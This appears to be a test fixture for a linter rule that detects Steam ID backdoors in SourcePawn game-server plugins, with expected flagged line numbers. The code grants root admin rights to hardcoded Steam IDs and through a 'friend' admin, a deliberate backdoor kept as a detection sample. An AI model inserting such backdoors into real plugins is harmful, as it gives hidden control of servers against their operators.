// policy: Malicious::ProhibitSteamIdBackdoors
// expect: 6 6 7
public void OnClientPostAdminCheck(int client) {
	char auth[32];
	GetClientAuthId(client, AuthId_Steam2, auth, sizeof(auth));
	if (StrEqual(auth, "STEAM_0:1:12345") || StrEqual(auth, "[U:1:24691]")
		|| StrEqual(auth, "76561197960290419")) {
		SetUserFlagBits(client, ADMFLAG_ROOT);
	}
}

public void OnClientAuthorized(int client, const char[] auth) {
	if (StrEqual(auth, "STEAM_0:1:12345")) {
		PrintToChatAll("The author joined");
	}
}

void Grant(int client) {
	AdminId admin = CreateAdmin("friend");
	admin.SetFlag(Admin_Root, true);
	SetUserAdmin(client, admin);
}
